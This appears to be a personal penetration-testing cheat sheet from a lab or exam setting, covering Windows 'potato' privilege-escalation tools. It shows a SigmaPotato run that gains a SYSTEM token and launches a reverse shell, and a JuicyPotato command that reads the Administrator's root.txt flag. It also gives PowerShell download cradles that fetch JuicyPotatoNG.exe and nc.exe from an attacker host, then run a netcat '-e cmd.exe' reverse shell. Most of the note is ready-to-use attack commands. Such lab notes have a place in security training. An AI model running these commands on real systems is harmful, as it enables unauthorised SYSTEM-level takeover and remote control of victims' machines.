---
publish: true
created: 2026-02-06T18:45:47.064+05:30
modified: 2026-06-22T08:53:08.708+05:30
---

## potato attack

CLSIDs - <https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md>
windows server 2019 clsids - <https://github.com/antonioCoco/RemotePotato0#clsid-list>

differences between potatoes. <https://jlajara.gitlab.io/Potatoes_Windows_Privesc>

try to use this <https://github.com/tylerdotrar/SigmaPotato>

### SigmaPotato

it takes a minute or two for the reverse shell to pop.

```
C:\ProgramData>.\SigmaPotato.exe --revshell 192.168.45.196 1235
.\SigmaPotato.exe --revshell 192.168.45.196 1235
[+] Starting Pipe Server...
[+] Created Pipe Name: \\.\pipe\SigmaPotato\pipe\epmapper
[+] Pipe Connected!
[+] Impersonated Client: NT AUTHORITY\NETWORK SERVICE
[+] Searching for System Token...
[+] PID: 880 | Token: 0x800 | User: NT AUTHORITY\SYSTEM
[+] Found System Token: True
[+] Duplicating Token...
[+] New Token Handle: 980
[+] Current Command Length: 10 characters
---
[+] Creating a simple PowerShell reverse shell...
[+] IP Address: 192.168.45.196 | Port: 1235
[+] Bootstrapping to an environment variable...
[+] Payload base64 encoded and set to local environment variable: '$env:SigmaBootstrap'
[+] Environment block inherited local environment variables.
[+] New Command to Execute: 'powershell -c (powershell -e $env:SigmaBootstrap)'
[+] Setting 'CREATE_UNICODE_ENVIRONMENT' process flag.
---
[+] Creating Process via 'CreateProcessAsUserW'
[+] Process Started with PID: 4612

[+] Process Output:
```

### JuicyPotato

```
PS C:\Users\merlin\Documents> C:\Users\merlin\Documents\JuicyPotato.exe -t * -l 1337 -p "C:\Windows\System32\cmd.exe" -a '/c type C:\Users\Administrator\Desktop\root.txt > C:\Users\merlin\Documents\root.txt'
```

### JuicyPotato-NG

This might not work now.

```powershell
powershell "IEX(New-Object Net.WebClient).DownloadFile('http://192.168.45.193:80/JuicyPotatoNG.exe', 'JuicyPotatoNG.exe')" -bypass executionpolicy

powershell "IEX(New-Object Net.WebClient).DownloadFile('http://192.168.45.193:80/nc.exe', 'nc.exe')" -bypass executionpolicy

.\JuicyPotatoNG.exe -t * -p "nc.exe" -a "192.168.45.193 23 -e cmd.exe"
```
